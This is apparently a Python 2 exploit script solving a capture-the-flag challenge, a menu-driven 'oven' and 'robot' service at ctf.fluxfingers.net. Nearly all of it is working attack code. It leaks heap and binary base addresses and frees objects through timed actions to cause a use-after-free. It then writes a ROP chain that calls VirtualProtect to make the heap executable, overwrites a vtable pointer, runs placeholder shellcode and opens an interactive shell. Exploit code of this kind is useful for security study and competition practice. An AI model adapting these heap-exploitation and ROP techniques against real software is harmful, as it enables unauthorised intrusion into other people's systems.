#! /usr/local/pyenv/shims/python
# _*_ coding: utf-8 _*_
import struct, socket, sys, os
import time, telnetlib, hexdump

def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delm='\n'):
  data = ''
  while not data.endswith(delm):
    data += f.readline()
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a):
  return struct.pack("<I", a&0xffffffff)

def u(a):
  return struct.unpack("<I", a)[0]

def xxd(a):
  hexdump.hexdump(a)

def countdown(n):
  for i in xrange(n, 0, -1):
    print str(i) + "..",
    sys.stdout.flush()
    time.sleep(1)
  print

def dbg(ss):
  print "[+] %s: 0x%x"%(ss, eval(ss))

if sys.argv[1] == 'r':
  HOST, PORT = "ctf.fluxfingers.net", 1340
else:
  HOST, PORT = "192.168.65.134", 27015

# ------------- menu --------------
B, L, S = 0, 1, 2
ON, OFF = 0, 1

def menu(r = ""):
  r += read_until(f, "[8] Quit\n\n")
  return r

def insert(type, time, slot, string):
  print "INSERT %d" % slot
  f.write("0\n")
  r = read_until(f, "[2] Semmel\n\n")
  f.write("%d\n" % type)
  r = read_until(f, ": \n\n")
  f.write("%d\n" % time)
  r = read_until(f, ": \n\n")
  f.write("%d\n" % slot)
  r = read_until(f, ": \n\n")
  f.write("%s\n" % string)
  return menu(r)

def remove(slot):
  print "REMOVE %d" % slot
  f.write("1\n")
  r = read_until(f, ":\n\n")
  f.write("%d\n" % slot)
  return menu(r)

def info(slot, type):
  print "INFO %d" % slot
  f.write("2\n")
  r = read_until(f, ":\n\n")
  f.write("%d\n" % slot)
  r = read_until(f, "[2] Semmel\n\n")
  f.write("%d\n" % type)
  return menu(r)
  
def edit(slot, string):
  print "EDIT %d" % slot
  f.write("3\n")
  r = read_until(f, ":\n\n")
  f.write("%d\n" % slot)
  r = read_until(f, ":\n\n")
  f.write("%s\n" % string)
  return menu(r)

def robot(onoff):
  if onoff == ON:
    print "ROBOT ON"
  elif onoff == OFF:
    print "ROBOT OFF"
  f.write("4\n")
  r = read_until(f, "[1] Stopn servicerobota\n\n")
  f.write("%d\n" % onoff)
  return menu(r)

def oven(onoff):
  if onoff == ON:
    print "OVEN ON"
    f.write("5\n")
    return menu(r)
  elif onoff == OFF:
    print "OVEN OFF"
    f.write("6\n")
    return menu()

# ----------- main -------------
s, f = sock(HOST, PORT)
if sys.argv[1] != 'r':
  raw_input("attach?")

menu()

# leak
insert(type=S, time=30, slot=0, string="DUMMY")
insert(type=S, time=30, slot=1, string="DUMMY")
insert(type=S, time=30, slot=2, string="LEAK1")
insert(type=L, time=30, slot=3, string="LEAK2")
r = info(slot=2, type=L)

heap = u(r[0x26b:0x26b+4])
heap_base = heap - 0x3970
vtable = u(r[0x27b:0x27b+4])
bin_base = vtable - 0x10f70
dbg("heap")
dbg("heap_base")
dbg("vtable")
dbg("bin_base")

# overwrite
insert(type=B, time=30, slot=4, string="FOOD_A")
insert(type=B, time=3, slot=5, string="VICTIM")
oven(ON)
countdown(3*5)
oven(OFF)
robot(ON)
countdown(1*5) # VICTIM is freed by robot
robot(OFF)
remove(slot=4) # FOOD_A is freed 

"""
0x00401b24: xchg eax, ebp ; mov esp, ebp ; pop ebp ; retn 0x000C ;  (1 found)
0x0040104b: ret  ;  (470 found)
0x0040c877: pop eax ; ret  ;  (1 found)
0x004076b9: jmp dword [eax] ;  (4 found)
.idata:0040E008 ; BOOL __stdcall VirtualProtect(LPVOID lpAddress,DWORD dwSize,DWORD flNewProtect,PDWORD lpflOldProtect)
"""
food_a = "AAAA" * 2           # padding
food_a += p(bin_base+0x1b24)  # stack pivot
food_a += p(bin_base+0x104b)  # ret2ret
food_a += "BBBB" * 3          # padding
food_a += p(bin_base+0xc877)  # pop eax
food_a += p(bin_base+0xe008)  # VirtualProtect@.idata
food_a += p(bin_base+0x76b9)  # jmp [eax]
food_a += p(heap+0x67c)       #  return addr: shellcode
food_a += p(heap_base)        #  arg1: lpAddress
food_a += p(0x5000)           #  arg2: dwSize
food_a += p(0x40)             #  arg3: flNewProtect(PAGE_EXECUTE_WRITEREAD)
food_a += p(heap_base)        #  arg4: lpflOldProtect(anywhere in edit buffer)
food_a += "\x90\x90\x90\xcc"  # shellcode
food_a = food_a.ljust(0x248) # padding
victim = p(heap+0x648)        # vtable pointer(address of stack pivot)
victim += victim.ljust(0x230) # padding(sizeof(Victim FOOD))

edit(slot=3, string=food_a+victim)

# trigger
oven(ON)
countdown(2*5)

shell(s)
  
